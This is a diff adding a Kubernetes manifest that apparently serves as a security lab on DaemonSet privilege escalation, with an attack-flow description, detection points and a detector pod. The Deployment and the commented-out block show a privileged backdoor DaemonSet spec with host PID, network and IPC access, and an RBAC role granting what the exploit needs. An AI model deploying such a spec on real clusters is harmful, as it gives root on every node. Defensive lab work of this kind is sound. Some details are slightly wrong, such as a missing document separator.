@@ -1,0 +1,277 @@
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: daemonset-escalation
+---
+# Lateral Movement Attack #3: DaemonSet Privilege Escalation
+# Description: Attacker creates a DaemonSet with escalated privileges
+# to gain root access on all cluster nodes.
+#
+# Attack Flow:
+# 1. Compromise: Attacker gains pod access with create pods/daemonsets permission
+# 2. Create: Deploy DaemonSet with privileged: true, hostPID: true, hostNetwork: true
+# 3. Escalate: DaemonSet pod runs on every node with root access
+# 4. Exploit: Access host processes, filesystem, network
+# 5. Persist: Establish persistence across cluster via multiple nodes
+#
+# Why DaemonSets are Powerful:
+# - One creation = access on ALL nodes (not just one pod)
+# - Running on every node = automatic persistence
+# - Difficult to remove (ReplicaSet automatically recreates)
+# - If network persists, restarts maintain access
+#
+# Detection Points:
+# - DaemonSet created outside of system namespaces
+# - DaemonSet with privileged: true
+# - DaemonSet with hostPID: true, hostNetwork: true
+# - Multiple system pods spawning unexpectedly
+# - Suspicious namespace creations at node level
+
+apiVersion: v1
+kind: ConfigMap
+metadata:
+  name: daemonset-escalation-guide
+  namespace: daemonset-escalation
+data:
+  privilege-escalation: |
+    DaemonSet Privilege Escalation Chain:
+    
+    1. Initial compromise in pod with limited permissions
+    2. Exploit RBAC to gain: verb "create" on "daemonsets"
+    3. Create DaemonSet with:
+       - privileged: true (run as root in host namespace)
+       - hostPID: true (access all node processes)
+       - hostNetwork: true (full network access on node)
+       - hostIPC: true (access host IPC)
+    
+    4. DaemonSet automatically creates pod on every node
+    5. Pod has full root access on node
+    6. From pod, attacker can:
+       - Access /proc/sys (kernel parameters)
+       - Mount /host filesystem
+       - Access container sockets (/var/run/docker.sock)
+       - Use kernel exploits for further escalation
+       - Install rootkit on node
+    
+    7. Result: Cluster-wide root access
+
+---
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: privilege-escalator
+  namespace: daemonset-escalation
+  labels:
+    app: escalator
+spec:
+  replicas: 1
+  selector:
+    matchLabels:
+      app: escalator
+  template:
+    metadata:
+      labels:
+        app: escalator
+    spec:
+      serviceAccountName: escalator-sa
+      containers:
+      - name: escalator
+        image: curlimages/curl:latest
+        command:
+        - sh
+        - -c
+        - |
+          echo "=== DaemonSet Escalation Attack ==="
+          
+          echo "[*] Step 1: Check if we can create DaemonSets"
+          kubectl auth can-i create daemonsets 2>/dev/null && \
+            echo "[+] YES - Permission to create DaemonSets!" || \
+            echo "[-] NO - Cannot create DaemonSets directly"
+          
+          echo ""
+          echo "[*] Step 2: If yes, deploy malicious DaemonSet"
+          echo "[*] This DaemonSet spec would be used:"
+          
+          cat <<'EOF'
+          apiVersion: apps/v1
+          kind: DaemonSet
+          metadata:
+            name: backdoor-daemonset
+          spec:
+            selector:
+              matchLabels:
+                app: backdoor
+            template:
+              spec:
+                hostPID: true      # Access host processes
+                hostNetwork: true  # Access host network
+                hostIPC: true      # Access host IPC
+                containers:
+                - name: backdoor
+                  image: ubuntu:latest
+                  securityContext:
+                    privileged: true  # Root access
+                  command: ["bash", "-c", "sleep 36000"]
+          EOF
+          
+          echo ""
+          echo "[*] Step 3: DaemonSet would run on every node"
+          kubectl get nodes -o wide 2>/dev/null | tail -n+2 | while read line; do
+            echo "[+] Compromise node: $line"
+          done || echo "[*] Cannot enumerate nodes"
+          
+          echo ""
+          echo "[Impact] After DaemonSet deployment:"
+          echo "  ✓ Root access on EVERY node"
+          echo "  ✓ Full cluster network access"
+          echo "  ✓ Can access all containers on node"
+          echo "  ✓ Can modify host filesystem"
+          echo "  ✓ Can install persistence (rootkits)"
+          echo "  ✓ Can pivot to other infrastructure"
+          
+          sleep 3600
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: escalator-sa
+  namespace: daemonset-escalation
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: escalator-role
+  namespace: daemonset-escalation
+rules:
+# This is what's needed to exploit the vulnerability
+- apiGroups: ["apps"]
+  resources: ["daemonsets"]
+  verbs: ["create", "get", "list"]
+- apiGroups: [""]
+  resources: ["pods"]
+  verbs: ["get", "list"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: escalator-binding
+  namespace: daemonset-escalation
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: Role
+  name: escalator-role
+subjects:
+- kind: ServiceAccount
+  name: escalator-sa
+  namespace: daemonset-escalation
+
+---
+# Example of what an attacker would deploy
+# (Commented out to prevent accidental deployment)
+---
+# apiVersion: apps/v1
+# kind: DaemonSet
+# metadata:
+#   name: backdoor-daemonset
+#   namespace: daemonset-escalation
+# spec:
+#   selector:
+#     matchLabels:
+#       app: system-monitor
+#   template:
+#     metadata:
+#       labels:
+#         app: system-monitor
+#     spec:
+#       hostPID: true
+#       hostNetwork: true
+#       hostIPC: true
+#       containers:
+#       - name: monitor
+#         image: ubuntu:22.04
+#         securityContext:
+#           privileged: true
+#         command:
+#         - bash
+#         - -c
+#         - |
+#           echo "Backdoor pod running on $(hostname)"
+#           # Attacker payload would go here
+#           sleep 36000
+
+---
+# Detection helper
+apiVersion: v1
+kind: Pod
+metadata:
+  name: daemonset-detection-check
+  namespace: daemonset-escalation
+  labels:
+    tool: detector
+spec:
+  serviceAccountName: detector-sa
+  containers:
+  - name: detector
+    image: curlimages/curl:latest
+    command:
+    - sh
+    - -c
+    - |
+      echo "=== DaemonSet Escalation Detection Check ==="
+      
+      echo "[*] Checking for suspicious DaemonSets..."
+      
+      # Would check:
+      # kubectl get daemonsets -A
+      # kubectl get daemonsets -A -o json | jq '.items[] | select(.spec.template.spec.securityContext.privileged == true)'
+      
+      echo "[*] Red flags to look for:"
+      echo "  ✗ DaemonSets with privileged: true"
+      echo "  ✗ DaemonSets with hostPID: true"
+      echo "  ✗ DaemonSets with hostNetwork: true"
+      echo "  ✗ DaemonSets outside system namespaces"
+      echo "  ✗ DaemonSets with unusual images"
+      echo "  ✗ DaemonSets running as non-system users"
+      
+      echo ""
+      echo "[*] Current DaemonSets in cluster:"
+      kubectl get daemonsets -A 2>/dev/null || echo "Cannot enumerate"
+      
+      sleep 3600
+
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: detector-sa
+  namespace: daemonset-escalation
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: daemonset-detector
+rules:
+- apiGroups: ["apps"]
+  resources: ["daemonsets"]
+  verbs: ["get", "list"]
+- apiGroups: [""]
+  resources: ["pods"]
+  verbs: ["get", "list"]
+
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: daemonset-detector-binding
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: daemonset-detector
+subjects:
+- kind: ServiceAccount
+  name: detector-sa
+  namespace: daemonset-escalation
